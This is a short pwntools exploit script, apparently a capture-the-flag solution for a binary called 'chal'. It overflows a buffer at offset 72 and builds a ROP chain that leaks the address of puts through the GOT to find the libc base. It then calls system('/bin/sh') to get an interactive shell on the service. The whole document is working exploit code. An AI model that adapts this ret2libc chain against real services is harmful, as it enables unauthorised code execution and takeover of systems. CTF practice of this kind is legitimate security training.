from pwn import *

exe = './chal'
elf = ELF(exe)
libc = ELF('./libc.so.6')
context.binary = exe

p = remote('127.0.0.1', 5000)
#p = process(exe)

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]
gadget = rop.find_gadget(['pop rdi', 'pop r14', 'ret'])[0]

offset = 72

payload = b"A" * offset
payload += p64(gadget)
payload += p64(elf.got['puts'])
payload += p64(0xdeadbeef)
payload += p64(elf.plt['puts'])
payload += p64(ret)
payload += p64(elf.symbols['vuln'])

p.sendlineafter(b"laundry: ", payload)
p.recvuntil(b"complete")

leak = p.recvline().strip()
leak = u64(leak.ljust(8, b"\x00"))
libc.address = leak - libc.symbols['puts']

payload = b"A" * offset
payload += p64(gadget)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(0xdeadbeef)
payload += p64(libc.symbols['system'])

p.sendlineafter(b"laundry: ", payload)
p.interactive()
